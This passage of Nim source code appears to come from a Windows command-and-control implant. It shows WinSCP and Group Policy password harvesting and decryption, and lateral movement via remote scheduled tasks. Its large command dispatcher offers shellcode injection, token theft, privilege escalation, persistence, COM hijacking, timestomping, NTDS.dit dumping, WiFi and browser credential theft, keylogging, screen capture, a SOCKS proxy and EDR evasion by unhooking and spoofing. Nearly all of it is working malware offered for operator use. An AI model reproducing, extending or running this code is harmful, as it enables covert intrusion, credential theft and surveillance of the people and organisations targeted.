      var nameBuf: array[256, WCHAR]; var nameLen: DWORD = 256
      if RegEnumKeyExW(hKey, idx, addr nameBuf[0], addr nameLen, nil, nil, nil, nil) != 0: break
      let sname = $cast[WideCString](addr nameBuf[0])
      var hSess: HKEY
      if RegOpenKeyExW(hKey, newWideCString(sname), 0, KEY_READ, addr hSess) == 0:
        var vbuf: array[512, WCHAR]; var vlen: DWORD = 0; var rtype: DWORD = 0
        var host, user, passEnc, port = ""
        vlen = DWORD(sizeof(vbuf))
        if RegQueryValueExW(hSess, newWideCString("HostName"), nil, addr rtype,
            cast[LPBYTE](addr vbuf[0]), addr vlen) == 0:
          host = $cast[WideCString](addr vbuf[0])
        var portVal: DWORD = 22; vlen = DWORD(sizeof(portVal))
        if RegQueryValueExW(hSess, newWideCString("PortNumber"), nil, addr rtype,
            cast[LPBYTE](addr portVal), addr vlen) == 0: port = $portVal
        else: port = "22"
        vlen = DWORD(sizeof(vbuf))
        if RegQueryValueExW(hSess, newWideCString("UserName"), nil, addr rtype,
            cast[LPBYTE](addr vbuf[0]), addr vlen) == 0:
          user = $cast[WideCString](addr vbuf[0])
        vlen = DWORD(sizeof(vbuf))
        if RegQueryValueExW(hSess, newWideCString("Password"), nil, addr rtype,
            cast[LPBYTE](addr vbuf[0]), addr vlen) == 0:
          passEnc = $cast[WideCString](addr vbuf[0])
        output.add("[WinSCP] " & sname & " host=" & host & " port=" & port &
            " user=" & user & " pass_enc=" & passEnc & "\n")
        discard RegCloseKey(hSess)
      idx = idx + DWORD(1)
    discard RegCloseKey(hKey)
  return if output == "": "no sessions found" else: output

proc doGppHunt(): string =
  let xmlFiles = runShell("dir /s /b %LOGONSERVER%\\SYSVOL\\*.xml 2>nul")
  if xmlFiles.strip() == "": return "no .xml files found in SYSVOL"
  var output = ""
  for line in xmlFiles.splitLines():
    let f = line.strip()
    if f.len == 0: continue
    var content: string
    try: content = readFile(f)
    except: continue
    let cpIdx = content.find("cpassword=\"")
    if cpIdx < 0: continue
    let start = cpIdx + 11
    let eIdx = content.find('"', start)
    if eIdx < 0 or eIdx <= start: continue
    let cpass = content[start..<eIdx]
    if cpass.len == 0: continue
    let ps = "$k=[byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62," &
      "0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6," &
      "0x6c,0x1b);" &
      "try{$d=[Convert]::FromBase64String('" & cpass & "');" &
      "$a=[Security.Cryptography.AesManaged]::new();" &
      "$a.Key=$k;$a.IV=New-Object byte[] 16;$a.Mode='CBC';$a.Padding='Zeros';" &
      "$dc=$a.CreateDecryptor();" &
      "$pt=$dc.TransformFinalBlock($d,0,$d.Length);" &
      "[Text.Encoding]::Unicode.GetString($pt).TrimEnd([char]0)}catch{'[decrypt failed]'}"
    let dec = runShell("powershell.exe -NoP -NonI -W Hidden -C \"" & ps & "\"")
    output.add("file: " & f & "\ncpassword: " & cpass & "\nplaintext: " & dec.strip() & "\n\n")
  return if output == "": "no cpasswords found" else: output

proc doLateral(meth, host, user, pass, cmd: string): string =
  if meth == "atexec":
    var out2 = ""
    if user != "":
      out2.add(runShell("net use \\\\" & host & "\\IPC$ \"" & pass &
        "\" /user:\"" & user & "\" 2>&1") & "\n")
    let tn = "endgame_lat"
    out2.add(runShell("schtasks /Create /S " & host & " /RU SYSTEM /SC ONCE /ST 00:00 /F /TN " &
      tn & " /TR \"" & cmd & "\" 2>&1") & "\n")
    out2.add(runShell("schtasks /Run /S " & host & " /TN " & tn & " 2>&1") & "\n")
    Sleep(DWORD(3000))
    out2.add(runShell("schtasks /Delete /S " & host & " /TN " & tn & " /F 2>&1") & "\n")
    if user != "": discard runShell("net use \\\\" & host & "\\IPC$ /delete 2>&1")
    return out2
  return "unknown lateral method: " & meth

proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload: seq[byte]) =
  case typ.toUpperAscii()
  of "SHELL":
    t.sendResult(id, runShell(args), "")
  of "SLEEP":
    let parts = args.split(' ')
    if parts.len >= 1:
      try: sleepSecDyn = parseInt(parts[0]) except: discard
    if parts.len >= 2:
      try: jitterDyn = parseInt(parts[1]) except: discard
    t.sendResult(id, "[+] sleep updated", "")
  of "SYSINFO":
    let info = "hostname=" & getEnvCmd("COMPUTERNAME","?") &
      "\nusername=" & getEnvCmd("USERNAME","?") &
      "\nos=windows/amd64\npid=" & $GetCurrentProcessId()
    t.sendResult(id, info, "")
  of "PS":
    t.sendResult(id, runShell("tasklist /FO CSV /NH 2>&1"), "")
  of "PWD":
    t.sendResult(id, getCurrentDir(), "")
  of "CD":
    try: setCurrentDir(args); t.sendResult(id, getCurrentDir(), "")
    except: t.sendResult(id, "", "cd: " & getCurrentExceptionMsg())
  of "LS":
    var lsOut = ""
    let dir = if args == "": getCurrentDir() else: args
    try:
      for kind, path in walkDir(dir):
        let k = case kind
          of pcFile: "F"
          of pcDir: "D"
          else: "?"
        lsOut.add(k & "  " & path & "\n")
    except: lsOut = "[error listing]"
    t.sendResult(id, lsOut, "")
  of "LS_JSON":
    let dir = if args == "": getCurrentDir() else: args
    try:
      let absPath = absolutePath(dir)
      var entriesArr = newJArray()
      for kind, item in walkDir(absPath):
        let name = item.extractFilename()
        let isDir = kind in {pcDir, pcLinkToDir}
        var sz: int64 = 0
        var modStr = ""
        try:
          let info = getFileInfo(item)
          sz      = info.size
          modStr  = $info.lastWriteTime
        except: discard
        entriesArr.add(%*{"name": name, "is_dir": isDir, "size": sz, "mod": modStr})
      let resp = %*{"cwd": getCurrentDir(), "path": absPath, "entries": entriesArr}
      t.sendResult(id, $resp, "")
    except CatchableError as e:
      t.sendResult(id, $(%*{"error": e.msg}), "")

  of "PS_JSON":
    var procs = newJArray()
    var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap != INVALID_HANDLE_VALUE:
      var pe: PROCESSENTRY32W
      pe.dwSize = sizeof(PROCESSENTRY32W).DWORD
      if Process32FirstW(snap, addr pe) != 0:
        while true:
          let name = $cast[WideCString](addr pe.szExeFile[0])
          procs.add(%*{"pid": pe.th32ProcessID.int, "name": name, "security": ""})
          if Process32NextW(snap, addr pe) == 0: break
      CloseHandle(snap)
    t.sendResult(id, $procs, "")

  of "DRIVES":
    let drivesRaw = runShell("wmic logicaldisk get name /format:list 2>&1")
    var entriesArr = newJArray()
    for line in drivesRaw.splitLines():
      let l = line.strip()
      if l.startsWith("Name=") and l.len > 5:
        let drive = l[5..^1].strip()
        if drive.len > 0:
          entriesArr.add(%*{"name": drive & "\\", "is_dir": true, "size": 0, "mod": ""})
    t.sendResult(id, $(%*{"cwd": "", "path": "", "drives": true, "entries": entriesArr}), "")

  of "NET_SHARES":
    let host    = args.strip(chars = {'\\', '/'})
    let netOut  = runShell("net view \\\\" & host & " /all 2>&1")
    var entriesArr = newJArray()
    var parsing = false
    for line in netOut.splitLines():
      let l = line.strip()
      if "---" in l: parsing = true; continue
      if not parsing or l == "": continue
      if "completado" in l.toLowerAscii() or "completed" in l.toLowerAscii(): break
      let parts = l.splitWhitespace()
      if parts.len >= 2 and parts[1].toLowerAscii() in ["disk","disco"]:
        entriesArr.add(%*{"name": parts[0], "is_dir": true, "size": 0, "mod": ""})
    t.sendResult(id, $(%*{"cwd": "", "path": "\\\\" & host, "shares": true, "entries": entriesArr}), "")

  of "CAT":
    try: t.sendResult(id, readFile(args), "")
    except: t.sendResult(id, "", "cat: " & getCurrentExceptionMsg())
  of "MKDIR":
    try: createDir(args); t.sendResult(id, "[+] created", "")
    except: t.sendResult(id, "", "mkdir: " & getCurrentExceptionMsg())
  of "RM":
    try:
      if dirExists(args): removeDir(args)
      else: removeFile(args)
      t.sendResult(id, "[+] removed", "")
    except: t.sendResult(id, "", "rm: " & getCurrentExceptionMsg())
  of "ENV":
    t.sendResult(id, runShell("set 2>&1"), "")
  of "SCREENSHOT":
    let (data, noDesktop) = doScreenshot()
    if noDesktop:
      t.sendResult(id, "", "screenshot: no_interactive_desktop")
    elif data.len == 0:
      t.sendResult(id, "", "screenshot failed")
    else:
      t.uploadFile(id, "screenshot.bmp", data)
      t.sendResult(id, "[+] screenshot captured (" & $data.len & " bytes)", "")
  of "INJECT_REMOTE":
    if payload.len == 0: t.sendResult(id, "", "no shellcode payload"); return
    try:
      let pid = parseJson(args){"pid"}.getInt(0)
      if pid == 0: t.sendResult(id, "", "INJECT_REMOTE requires {\"pid\":N}"); return
      t.sendResult(id, doInjectRemote(pid, payload), "")
    except: t.sendResult(id, "", "inject_remote: " & getCurrentExceptionMsg())
  of "INJECT_APC":
    if payload.len == 0: t.sendResult(id, "", "no shellcode payload"); return
    try:
      let pid = parseJson(args){"pid"}.getInt(0)
      if pid == 0: t.sendResult(id, "", "INJECT_APC requires {\"pid\":N}"); return
      t.sendResult(id, doInjectAPC(pid, payload), "")
    except: t.sendResult(id, "", "inject_apc: " & getCurrentExceptionMsg())
  of "TOKEN_STEAL":
    try:
      let pid = parseJson(args){"pid"}.getInt(0)
      if pid == 0: t.sendResult(id, "", "TOKEN_STEAL requires {\"pid\":N}"); return
      t.sendResult(id, doTokenSteal(pid), "")
    except: t.sendResult(id, "", "token_steal: " & getCurrentExceptionMsg())
  of "TOKEN_MAKE":
    try:
      let j = parseJson(args)
      let user   = j{"user"}.getStr()
      let domain = j{"domain"}.getStr(".")
      let pass   = j{"pass"}.getStr()
      if user == "" or pass == "": t.sendResult(id, "", "TOKEN_MAKE requires user+pass"); return
      t.sendResult(id, doTokenMake(user, domain, pass), "")
    except: t.sendResult(id, "", "token_make: " & getCurrentExceptionMsg())
  of "TOKEN_DROP":
    t.sendResult(id, doTokenDrop(), "")
  of "TOKEN_WHOAMI":
    t.sendResult(id, doTokenWhoami(), "")
  of "GETSYSTEM":
    t.sendResult(id, doGetSystem(), "")
  of "PERSIST":
    try:
      let j = parseJson(args)
      let name = j{"name"}.getStr("Updater")
      let cmd  = j{"cmd"}.getStr()
      let meth = j{"method"}.getStr("registry")
      if cmd == "": t.sendResult(id, "", "PERSIST requires cmd"); return
      t.sendResult(id, doPersist(name, cmd, meth), "")
    except: t.sendResult(id, "", "persist: " & getCurrentExceptionMsg())
  of "PERSIST_RM":
    try:
      let j = parseJson(args)
      let name = j{"name"}.getStr()
      let meth = j{"method"}.getStr("registry")
      if name == "": t.sendResult(id, "", "PERSIST_RM requires name"); return
      t.sendResult(id, doPersistRm(name, meth), "")
    except: t.sendResult(id, "", "persist_rm: " & getCurrentExceptionMsg())
  of "REG_QUERY":
    t.sendResult(id, runShell("reg query \"" & args & "\" 2>&1"), "")
  of "REG_LIST":
    t.sendResult(id, runShell("reg query \"" & args & "\" /s 2>&1"), "")
  of "REG_SET":
    try:
      let j = parseJson(args)
      let path = j{"path"}.getStr()
      let name = j{"name"}.getStr()
      let typ2 = j{"type"}.getStr("REG_SZ")
      let val  = j{"value"}.getStr()
      t.sendResult(id, runShell("reg add \"" & path & "\" /v \"" & name &
        "\" /t " & typ2 & " /d \"" & val & "\" /f 2>&1"), "")
    except: t.sendResult(id, "", "reg_set: " & getCurrentExceptionMsg())
  of "REG_DELETE":
    try:
      let j = parseJson(args)
      let path = j{"path"}.getStr()
      let name = j{"name"}.getStr()
      let cmd2 = if name != "":
        "reg delete \"" & path & "\" /v \"" & name & "\" /f 2>&1"
      else:
        "reg delete \"" & path & "\" /f 2>&1"
      t.sendResult(id, runShell(cmd2), "")
    except: t.sendResult(id, "", "reg_delete: " & getCurrentExceptionMsg())
  of "PORT_SCAN":
    try:
      let j = parseJson(args)
      let host    = j{"host"}.getStr("127.0.0.1")
      let ports   = j{"ports"}.getStr("80,443,445,3389,22,21,8080,8443")
      let timeout = j{"timeout"}.getInt(500)
      t.sendResult(id, doPortScan(host, ports, timeout), "")
    except: t.sendResult(id, "", "port_scan: " & getCurrentExceptionMsg())
  of "MINIDUMP":
    try:
      let outPath = parseJson(args){"path"}.getStr("C:\\Windows\\Temp\\1.dmp")
      t.sendResult(id, doMinidump(outPath), "")
    except: t.sendResult(id, "", "minidump: " & getCurrentExceptionMsg())
  of "HWBP_CLEAR":
    clearHWBP()
    t.sendResult(id, "[+] HWBP cleared", "")
  of "WIPE_MZ":
    wipeMZHeader()
    t.sendResult(id, "[+] MZ header wiped", "")
  of "PPID":
    try:
      let j = parseJson(args)
      let cmd    = j{"cmd"}.getStr("cmd.exe")
      let parent = j{"parent"}.getStr("explorer.exe")
      if spawnWithPPID(cmd, parent):
        t.sendResult(id, "[+] spawned with PPID=" & parent, "")
      else:
        t.sendResult(id, "", "ppid spoof failed — check permissions")
    except: t.sendResult(id, "", "ppid: " & getCurrentExceptionMsg())
  of "CONFIG":
    try:
      let j = parseJson(args)
      if j.hasKey("sleep_sec"):     sleepSecDyn     = j["sleep_sec"].getInt()
      if j.hasKey("jitter_pct"):    jitterDyn       = j["jitter_pct"].getInt()
      if j.hasKey("working_hours"): workingHoursDyn = j["working_hours"].getStr()
      t.sendResult(id, "[+] config updated", "")
    except: t.sendResult(id, "", "config: " & getCurrentExceptionMsg())
  of "EXEC_PE":
    if payload.len == 0: t.sendResult(id, "", "no PE payload"); return
    try:
      t.sendResult(id, execPE(payload), "")
    except: t.sendResult(id, "", "exec_pe: " & getCurrentExceptionMsg())
  of "KILL":
    t.sendResult(id, "bye", "")
    quit(0)
  of "UPLOAD":
    try:
      let j = parseJson(args)
      let remotePath = j["remote_path"].getStr()
      let data = t.downloadFile(j["filename"].getStr())
      if data.len == 0: t.sendResult(id, "", "download failed"); return
      writeFile(remotePath, cast[string](data))
      t.sendResult(id, "written " & $data.len & " bytes to " & remotePath, "")
    except: t.sendResult(id, "", getCurrentExceptionMsg())
  of "DOWNLOAD":
    try:
      let data = cast[seq[byte]](readFile(args))
      t.uploadFile(id, extractFilename(args), data)
      t.sendResult(id, "uploaded " & $data.len & " bytes", "")
    except: t.sendResult(id, "", "read failed: " & getCurrentExceptionMsg())
  of "KERB_LIST":
    t.sendResult(id, kerberosListTickets(), "")
  of "KERB_PTT":
    t.sendResult(id, kerberosPassTheTicket(args), "")
  of "KERB_PURGE":
    t.sendResult(id, kerberosPurge(), "")
  # ── Phase 1: TIMESTOMP, COM_HIJACK, CLIP_GET, CRED_WIFI, NTDS_DUMP ──────────
  of "TIMESTOMP":
    try:
      let j = parseJson(args)
      let target = j{"target"}.getStr()
      let refPath = j{"ref"}.getStr("C:\\Windows\\System32\\kernel32.dll")
      if target == "": t.sendResult(id, "", "TIMESTOMP: {\"target\":\"path\"} required"); return
      var hRef = CreateFileW(newWideCString(refPath), GENERIC_READ,
                  FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING,
                  FILE_ATTRIBUTE_NORMAL or FILE_FLAG_BACKUP_SEMANTICS, 0)
      if hRef == INVALID_HANDLE_VALUE: t.sendResult(id, "", "TIMESTOMP: cannot open ref"); return
      var ct, at, mt: FILETIME
      discard GetFileTime(hRef, addr ct, addr at, addr mt)
      discard CloseHandle(hRef)
      var hDst = CreateFileW(newWideCString(target), FILE_WRITE_ATTRIBUTES,
                  FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING,
                  FILE_ATTRIBUTE_NORMAL or FILE_FLAG_BACKUP_SEMANTICS, 0)
      if hDst == INVALID_HANDLE_VALUE: t.sendResult(id, "", "TIMESTOMP: cannot open target"); return
      discard SetFileTime(hDst, addr ct, addr at, addr mt)
      discard CloseHandle(hDst)
      t.sendResult(id, "[+] timestamps cloned from " & refPath & " to " & target, "")
    except: t.sendResult(id, "", "timestomp: " & getCurrentExceptionMsg())
  of "COM_HIJACK":
    try:
      let j = parseJson(args)
      let clsid = j{"clsid"}.getStr()
      let dllPath = j{"path"}.getStr()
      if clsid == "" or dllPath == "":
        t.sendResult(id, "", "COM_HIJACK: {\"clsid\":\"...\",\"path\":\"...\"} required"); return
      let keyPath = "Software\\Classes\\CLSID\\{" & clsid & "}\\InprocServer32"
      var hk: HKEY
      if RegCreateKeyExW(HKEY_CURRENT_USER, newWideCString(keyPath), 0, nil,
                         0, KEY_SET_VALUE, nil, addr hk, nil) != ERROR_SUCCESS:
        t.sendResult(id, "", "COM_HIJACK: RegCreateKeyEx failed"); return
      let dllW = newWideCString(dllPath)
      discard RegSetValueExW(hk, nil, 0, REG_SZ,
                             cast[ptr BYTE](addr dllW[0]), DWORD((dllPath.len+1)*2))
      let threadModel = newWideCString("Apartment")
      discard RegSetValueExW(hk, newWideCString("ThreadingModel"), 0, REG_SZ,
                             cast[ptr BYTE](addr threadModel[0]), 20)
      discard RegCloseKey(hk)
      t.sendResult(id, "[+] COM hijack: HKCU\\" & keyPath & " -> " & dllPath, "")
    except: t.sendResult(id, "", "com_hijack: " & getCurrentExceptionMsg())
  of "COM_HIJACK_RM":
    try:
      let clsid = parseJson(args){"clsid"}.getStr()
      if clsid == "": t.sendResult(id, "", "COM_HIJACK_RM: {\"clsid\":\"...\"} required"); return
      let keyPath = "Software\\Classes\\CLSID\\{" & clsid & "}"
      discard RegDeleteTreeW(HKEY_CURRENT_USER, newWideCString(keyPath))
      t.sendResult(id, "[+] COM hijack removed", "")
    except: t.sendResult(id, "", "com_hijack_rm: " & getCurrentExceptionMsg())
  of "CLIP_GET":
    if OpenClipboard(0) == 0:
      t.sendResult(id, "", "CLIP_GET: OpenClipboard failed")
    else:
      let hData = GetClipboardData(CF_TEXT)
      if hData == 0:
        discard CloseClipboard()
        t.sendResult(id, "", "CLIP_GET: no text in clipboard")
      else:
        let text = cast[cstring](GlobalLock(hData))
        let res = if text != nil: $text else: ""
        discard GlobalUnlock(hData)
        discard CloseClipboard()
        t.sendResult(id, if res == "": "[clipboard empty]" else: res, "")
  of "CRED_WIFI":
    let profilesOut = runShell("netsh wlan show profiles 2>&1")
    var combined = ""
    for line in profilesOut.splitLines():
      let idx = line.find("All User Profile")
      if idx < 0: continue
      let colon = line.find(':', idx)
      if colon < 0: continue
      let name = line[colon+1..^1].strip()
      if name == "": continue
      let detail = runShell("netsh wlan show profile name=\"" & name & "\" key=clear 2>&1")
      combined.add(detail & "\n")
    t.sendResult(id, if combined == "": "[no WiFi profiles found]" else: combined, "")
  of "NTDS_DUMP":
    let outDir = try: parseJson(args){"path"}.getStr("C:\\Windows\\Temp\\ntds_ifm") except: "C:\\Windows\\Temp\\ntds_ifm"
    let r = runShell("ntdsutil \"ac i ntds\" \"ifm\" \"create full " & outDir & "\" q q 2>&1")
    t.sendResult(id, r, "")
  # ── Phase 2a: ADS ──────────────────────────────────────────────────────────
  of "ADS_LIST":
    if args == "": t.sendResult(id, "", "ADS_LIST: path required"); return
    var result2 = ""
    var sd: WIN32_FIND_STREAM_DATA
    let wpath = newWideCString(args)
    let hS = FindFirstStreamW(wpath, 0.STREAM_INFO_LEVELS, addr sd, 0)
    if hS == INVALID_HANDLE_VALUE:
      t.sendResult(id, "[no alternate streams]", "")
    else:
      result2.add($cast[WideCString](addr sd.cStreamName[0]) & "\t" & $sd.StreamSize.QuadPart & " bytes\n")
      while FindNextStreamW(hS, addr sd) != 0:
        result2.add($cast[WideCString](addr sd.cStreamName[0]) & "\t" & $sd.StreamSize.QuadPart & " bytes\n")
      discard FindClose(hS)
      t.sendResult(id, result2, "")
  of "ADS_READ":
    try:
      let j = parseJson(args)
      let filePath = j{"file"}.getStr()
      let stream = j{"stream"}.getStr()
      if filePath == "" or stream == "":
        t.sendResult(id, "", "ADS_READ: {\"file\":\"...\",\"stream\":\"...\"} required"); return
      let adsPath = filePath & ":" & stream
      var hF = CreateFileW(newWideCString(adsPath), GENERIC_READ,
               FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
      if hF == INVALID_HANDLE_VALUE:
        t.sendResult(id, "", "ADS_READ: open failed (err " & $GetLastError() & ")"); return
      let fsz = GetFileSize(hF, nil)
      if fsz == 0:
        discard CloseHandle(hF)
        t.sendResult(id, "[+] ADS stream is empty", ""); return
      var buf = newSeq[byte](fsz)
      var rd: DWORD
      discard ReadFile(hF, addr buf[0], fsz, addr rd, nil)
      discard CloseHandle(hF)
      buf.setLen(rd)
      t.uploadFile(id, stream, buf)
      t.sendResult(id, "[+] ADS read " & $rd & " bytes", "")
    except: t.sendResult(id, "", "ads_read: " & getCurrentExceptionMsg())
  of "ADS_WRITE":
    try:
      let j = parseJson(args)
      let filePath = j{"file"}.getStr()
      let stream = j{"stream"}.getStr()
      let data = j{"data"}.getStr()
      if filePath == "" or stream == "":
        t.sendResult(id, "", "ADS_WRITE: {\"file\":,\"stream\":,\"data\":} required"); return
      let adsPath = filePath & ":" & stream
      var hF = CreateFileW(newWideCString(adsPath), GENERIC_WRITE,
               0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
      if hF == INVALID_HANDLE_VALUE:
        t.sendResult(id, "", "ADS_WRITE: create failed (err " & $GetLastError() & ")"); return
      var wr: DWORD
      discard WriteFile(hF, cast[LPCVOID](unsafeAddr data[0]), DWORD(data.len), addr wr, nil)
      discard CloseHandle(hF)
      t.sendResult(id, "[+] wrote " & $wr & " bytes to " & adsPath, "")
    except: t.sendResult(id, "", "ads_write: " & getCurrentExceptionMsg())
  of "ADS_DEL":
    try:
      let j = parseJson(args)
      let filePath = j{"file"}.getStr()
      let stream = j{"stream"}.getStr()
      if filePath == "" or stream == "":
        t.sendResult(id, "", "ADS_DEL: {\"file\":\"...\",\"stream\":\"...\"} required"); return
      let adsPath = filePath & ":" & stream
      if DeleteFileW(newWideCString(adsPath)) != 0:
        t.sendResult(id, "[+] ADS stream deleted", "")
      else:
        t.sendResult(id, "", "ADS_DEL: DeleteFile failed (err " & $GetLastError() & ")")
    except: t.sendResult(id, "", "ads_del: " & getCurrentExceptionMsg())
  # ── Phase 2d: Screenwatch ──────────────────────────────────────────────────
  of "SCREENWATCH_START":
    if not gSwStop:
      t.sendResult(id, "[-] screenwatch already running", ""); return
    gSwInterval = try: parseJson(args){"interval"}.getInt(10) except: 10
    if gSwInterval < 1: gSwInterval = 1
    gSwTaskId = id; gSwLastTick = 0; gSwFrame = 0; gSwStop = false
    t.sendResult(id, "[+] screenwatch started (interval " & $gSwInterval & "s)", "")
  of "SCREENWATCH_STOP":
    if gSwStop:
      t.sendResult(id, "[-] screenwatch not running", ""); return
    gSwStop = true; gSwFrame = 0
    t.sendResult(id, "[+] screenwatch stopped", "")
  of "TOKEN_STORE_STEAL":
    try:
      let j = parseJson(args)
      let pid2 = DWORD(j{"pid"}.getInt(0))
      if pid2 == 0: t.sendResult(id, "", "TOKEN_STORE_STEAL requires {\"pid\":N}"); return
      t.sendResult(id, doTokenStoreSteal(pid2), "")
    except: t.sendResult(id, "", "token_store_steal: " & getCurrentExceptionMsg())
  of "TOKEN_STORE_SHOW":
    if gTokenStore.len == 0:
      t.sendResult(id, "token store is empty", "")
    else:
      var tsOut = ""
      for e in gTokenStore:
        tsOut.add("id=" & $e.id & " pid=" & $e.pid & " user=" & e.user & "\n")
      t.sendResult(id, tsOut, "")
  of "TOKEN_STORE_USE":
    try:
      let tokId = parseJson(args){"id"}.getInt(0)
      if tokId <= 0 or tokId > gTokenStore.len:
        t.sendResult(id, "", "invalid token id"); return
      let entry = gTokenStore[tokId-1]
      if ImpersonateLoggedOnUser(entry.token) == 0:
        t.sendResult(id, "", "ImpersonateLoggedOnUser failed (err " & $GetLastError() & ")"); return
      t.sendResult(id, "[+] impersonating token id=" & $tokId & " user=" & entry.user, "")
    except: t.sendResult(id, "", "token_store_use: " & getCurrentExceptionMsg())
  of "TOKEN_STORE_REMOVE":
    try:
      let tokId = parseJson(args){"id"}.getInt(0)
      if tokId <= 0 or tokId > gTokenStore.len:
        t.sendResult(id, "", "invalid token id"); return
      discard CloseHandle(gTokenStore[tokId-1].token)
      gTokenStore.delete(tokId-1)
      t.sendResult(id, "[+] removed token id=" & $tokId, "")
    except: t.sendResult(id, "", "token_store_remove: " & getCurrentExceptionMsg())
  of "TOKEN_STORE_CLEAR":
    for e in gTokenStore: discard CloseHandle(e.token)
    gTokenStore.setLen(0)
    t.sendResult(id, "[+] token store cleared", "")
  of "BLOCKDLLS":
    t.sendResult(id, doBlockDlls(), "")
  of "PEB_SPOOF":
    try:
      let newPath = parseJson(args){"path"}.getStr()
      if newPath == "": t.sendResult(id, "", "PEB_SPOOF requires {\"path\":\"...\"}"); return
      t.sendResult(id, doPebSpoof(newPath), "")
    except: t.sendResult(id, "", "peb_spoof: " & getCurrentExceptionMsg())
  of "ISHELL_OPEN":
    try:
      let shell = parseJson(args){"shell"}.getStr("cmd")
      t.sendResult(id, doIshellOpen(shell), "")
    except: t.sendResult(id, "", "ishell_open: " & getCurrentExceptionMsg())
  of "ISHELL_RUN":
    t.sendResult(id, doIshellRun(args), "")
  of "ISHELL_CLOSE":
    t.sendResult(id, doIshellClose(), "")
  of "NTDLL_UNHOOK":
    t.sendResult(id, doNtdllUnhook(), "")
  of "KEYLOG_START":
    if not gKeylogStop:
      t.sendResult(id, "[-] keylogger already running", "")
    else:
      gKeylogStop = false; gKeylogBuf = ""
      var tid3: DWORD = 0
      gKeylogThread = CreateThread(nil, 0, keylogThreadProc, nil, 0, addr tid3)
      if gKeylogThread == 0:
        gKeylogStop = true
        t.sendResult(id, "", "CreateThread failed (err " & $GetLastError() & ")")
      else:
        t.sendResult(id, "[+] keylogger started", "")
  of "KEYLOG_STOP":
    gKeylogStop = true
    if gKeylogThread != 0:
      discard WaitForSingleObject(gKeylogThread, DWORD(3000))
      discard CloseHandle(gKeylogThread); gKeylogThread = 0
    t.sendResult(id, "[+] keylogger stopped", "")
  of "KEYLOG_DUMP":
    let kbuf = gKeylogBuf; gKeylogBuf = ""
    t.sendResult(id, if kbuf == "": "[empty]" else: kbuf, "")
  of "SOCKS_START":
    if not gSocksStop:
      t.sendResult(id, "[-] SOCKS5 already running", "")
    else:
      try:
        let port = parseJson(args){"port"}.getInt(1080)
        gSocksStop = false
        var tid4: DWORD = 0
        gSocksThread = CreateThread(nil, 0, socksServerProc, cast[LPVOID](port), 0, addr tid4)
        if gSocksThread == 0:
          gSocksStop = true
          t.sendResult(id, "", "CreateThread failed (err " & $GetLastError() & ")")
        else:
          t.sendResult(id, "[+] SOCKS5 started on port " & $port, "")
      except: t.sendResult(id, "", "socks_start: " & getCurrentExceptionMsg())
  of "SOCKS_STOP":
    gSocksStop = true
    if gSocksSocket != INVALID_SOCKET: discard closesocket(gSocksSocket)
    if gSocksThread != 0:
      discard WaitForSingleObject(gSocksThread, DWORD(3000))
      discard CloseHandle(gSocksThread); gSocksThread = 0
    t.sendResult(id, "[+] SOCKS5 stopped", "")
  of "SESSION_GOPHER":
    t.sendResult(id, doSessionGopher(), "")
  of "GPP_HUNT":
    t.sendResult(id, doGppHunt(), "")
  of "LATERAL":
    try:
      let j = parseJson(args)
      let meth = j{"method"}.getStr("atexec")
      let host = j{"host"}.getStr()
      let user = j{"user"}.getStr()
      let pass = j{"pass"}.getStr()
      let cmd  = j{"cmd"}.getStr()
      if host == "" or cmd == "":
        t.sendResult(id, "", "LATERAL requires host and cmd"); return
      t.sendResult(id, doLateral(meth, host, user, pass, cmd), "")
    except: t.sendResult(id, "", "lateral: " & getCurrentExceptionMsg())
  of "BROWSER_CREDS":
    t.sendResult(id, doBrowserCreds(), "")
  else:
    t.sendResult(id, "", "unknown task type: " & typ)
